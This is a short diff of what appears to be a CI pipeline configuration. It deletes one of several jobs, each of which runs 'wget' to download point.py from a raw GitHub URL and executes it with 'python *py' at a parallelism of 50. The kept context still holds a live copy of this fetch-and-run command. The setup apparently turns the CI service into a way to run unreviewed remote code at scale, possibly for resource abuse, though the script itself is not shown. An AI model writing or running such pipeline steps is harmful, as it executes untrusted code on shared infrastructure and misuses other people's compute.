@@ -16,10 +16,6 @@ blocks:
           commands:
             - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
           parallelism: 50
-        - name: 'Job #3'
-          commands:
-            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
-          parallelism: 50
   - name: 'Block #2'
     task:
       jobs:
